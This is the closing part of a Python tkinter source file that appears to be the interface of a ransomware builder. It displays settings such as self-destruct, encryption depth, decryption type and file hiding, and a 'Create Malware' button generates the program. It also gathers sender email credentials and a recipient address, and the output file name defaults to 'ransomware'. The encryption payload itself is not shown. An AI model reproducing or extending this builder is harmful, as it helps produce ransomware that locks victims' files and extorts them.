		self.console_text = tk.Label(non_scrollable_frame, text="Show Console: " + self.profile.show_console, font=("Helvetica", 12), bg=self.bg_color, fg=self.text_color)
		self.console_text.place(x=0, y=195)

		self.file_text = tk.Label(non_scrollable_frame, text="File Type: " + self.profile.file_type, font=("Helvetica", 12), bg=self.bg_color, fg=self.text_color)
		self.file_text.place(x=0, y=240)

		self.destruct_text = tk.Label(non_scrollable_frame, text="Self Destruct: " + self.profile.self_destruct, font=("Helvetica", 12), bg=self.bg_color, fg=self.text_color)
		self.destruct_text.place(x=0, y=285)

		self.depth_text = tk.Label(non_scrollable_frame, text="Encryption Depth: " + self.profile.encryption_depth, font=("Helvetica", 12), bg=self.bg_color, fg=self.text_color)
		self.depth_text.place(x=0, y=330)

		self.decryption_text = tk.Label(non_scrollable_frame, text="Decryption Type: " + self.profile.decryption_type, font=("Helvetica", 12), bg=self.bg_color, fg=self.text_color)
		self.decryption_text.place(x=0, y=375)

		self.hide_text = tk.Label(non_scrollable_frame, text="Hide File: " + self.profile.hide_file, font=("Helvetica", 12), bg=self.bg_color, fg=self.text_color)
		self.hide_text.place(x=0, y=420)

		# Creating "Create" Button
		self.create_profile = tk.Button(non_scrollable_frame, text="Create Malware", font=("Helvetica", 15), command=self.create_malware)
		self.create_profile.place(x=43, y=470, width=170, height=50)

	def create_custom_widgets(self):
		# Custom Widgets
		custom_border_frame = tk.Frame(self.window, bd=5, relief='solid', bg=self.bg_color)
		custom_border_frame.pack(side=tk.RIGHT, fill=tk.Y)

	def get_args(self):
		args, create_bool = final_args = self.GUI.args_popup(self.window, self.profile, self.bg_color, self.text_color)
		print(args.GUI_message)
		if create_bool:
			self.profile.file_name = args.file_name
			self.profile.project_name = args.project_name

			self.profile.from_email = args.from_email
			self.profile.from_password = args.from_password
			self.profile.to_email = args.to_email

			self.profile.GUI_message = args.GUI_message
			self.profile.GUI_type = args.GUI_type

			self.profile.text_file = args.text_file

			if self.profile.file_name.replace(" ", "") == "":
				self.profile.file_name = "ransomware"
			if self.profile.project_name.replace(" ", "") == "":
				self.profile.project_name = "Ransomware"
			return True
		else:
			return False

	def create_malware(self):
		# Checking For Problems
		if self.profile.file_type != ".py" and self.profile.decryption_type != "Pair":
			self.GUI.create_text_popup("Factory Warning", 300, 200, self.bg_color, self.text_color, "You cannot have an .exe with a single file decrypter. Plase pick something else.")
		else:
			# Getting Final Arguements
			if self.get_args():
				# Getting Temp Profile
				temp_profile = self.profile

				# Creating Create Class | create = 
				create = Create(temp_profile, self.GUI)

				# Parseing profile & imports
				create.parse_imports()
				create.parse_profile()
				
				# Creating Code for file(s)
				create.create_code()

				# Creating Folder, and file(s) inside
				create.create_file()

# Auto-Starting App
if __name__ == "__main__":
	app = App(sys.argv[0], '1000', '650', '#f0e6e6', '#281e1e')
	app.create_app_window()